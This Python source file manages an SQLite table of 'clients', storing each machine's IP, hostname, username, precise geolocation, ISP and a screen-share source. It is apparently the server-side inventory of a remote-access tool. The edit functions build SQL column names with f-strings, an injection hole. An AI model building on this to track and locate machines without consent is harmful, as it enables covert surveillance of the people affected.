import sqlite3
import os


class Client:
    def __init__(self, id, ip, status, computer_name, os, architecture, username, country, city, latitude, longitude, isp, timezone, organization, postal, connection_type, region, region_name, screen_share_source, socket_ip):
        self.id = id
        self.ip = ip
        self.status = status
        self.computer_name = computer_name
        self.os = os
        self.architecture = architecture
        self.username = username
        self.country = country
        self.city = city
        self.latitude = latitude
        self.longitude = longitude
        self.isp = isp
        self.timezone = timezone
        self.organization = organization
        self.postal = postal
        self.connection_type = connection_type
        self.region = region
        self.region_name = region_name
        self.screen_share_source = screen_share_source
        self.socket_ip = socket_ip
# Should be in server/data/clients.db


if not os.path.exists("data"):
    os.mkdir("data")

if (not os.path.exists("data/clients.db")):
    open("data/clients.db", "w").close()


def connect():
    """Connect to the database"""
    con = sqlite3.connect('data/clients.db')
    return con, con.cursor()

# Some information about the database:
# Table: clients
# Columns: id, name, ip, status, computer_name, os, architecture, username, country, city, latitude, longitude, isp, timezone, organization, postal, connection_type, region, region_name, screen_share_source


def check():
    con, cur = connect()
    """Check if the database has the required tables and if it even exists"""
    try:
        cur.execute("SELECT * FROM clients")
        return True
    except sqlite3.OperationalError:
        return False


def make_clients():
    con, cur = connect()
    """Create the clients table with an auto-incrementing primary key"""
    cur.execute("""
        CREATE TABLE clients (
            id INTEGER PRIMARY KEY,
            ip TEXT,
            status TEXT,
            computer_name TEXT,
            os TEXT,
            architecture TEXT,
            username TEXT,
            country TEXT,
            city TEXT,
            latitude TEXT,
            longitude TEXT,
            isp TEXT,
            timezone TEXT,
            organization TEXT,
            postal TEXT,
            connection_type TEXT,
            region TEXT,
            region_name TEXT,
            screen_share_source TEXT,
            socket_ip TEXT
        )
    """)
    con.commit()


if not check():

    make_clients()


def add_client(ip, status, computer_name, os, architecture, username, country, city, latitude, longitude, isp, timezone, organization, postal, connection_type, region, region_name, screen_share_source, socket_ip):
    con, cur = connect()
    print("Adding client to database")
    cur.execute("INSERT INTO clients (ip, status, computer_name, os, architecture, username, country, city, latitude, longitude, isp, timezone, organization, postal, connection_type, region, region_name, screen_share_source, socket_ip) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (ip, status, computer_name, os, architecture, username, country, city, latitude, longitude, isp, timezone, organization, postal, connection_type, region, region_name, screen_share_source, socket_ip))
    con.commit()


def get_clients():
    con, cur = connect()
    cur.execute("SELECT * FROM clients")
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client(id):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE id=?", (id,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_ip(ip):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE ip=?", (ip,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_status(status):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE status=?", (status,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_computer_name(computer_name):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE computer_name=?",
                (computer_name,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_os(os):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE os=?", (os,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_architecture(architecture):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE architecture=?", (architecture,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_username(username):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE username=?", (username,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_country(country):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE country=?", (country,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_city(city):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE city=?", (city,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def get_client_by_socket_ip(socket_ip):
    con, cur = connect()
    cur.execute("SELECT * FROM clients WHERE socket_ip=?", (socket_ip,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    return clients


def edit_clients(key, value):
    con, cur = connect()
    # Find the key we want to edit, then edit it
    # Do this for all of the clients
    cur.execute("SELECT * FROM clients")
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    for client in clients:
        cur.execute(
            f"UPDATE clients SET {key}=? WHERE id=?", (value, client.id))
        con.commit()


def edit_client(client_id, key, value):
    con, cur = connect()
    # Find the key we want to edit, then edit it
    # Do this for all of the clients
    cur.execute("SELECT * FROM clients WHERE id=?", (client_id,))
    client_records = cur.fetchall()

    clients = []
    for record in client_records:
        client = Client(*record)
        clients.append(client)

    for client in clients:
        cur.execute(
            f"UPDATE clients SET {key}=? WHERE id=?", (value, client.id))
        con.commit()
# Example usage:
# add_client("Client1", "192.168.1.100", "Online", "Computer1", "Windows 10", "x64", "user1", "US", "New York", "40.7128", "-74.0060", "ISP1", "EST", "Org1", "12345", "Cable", "US", "New York", "source1")
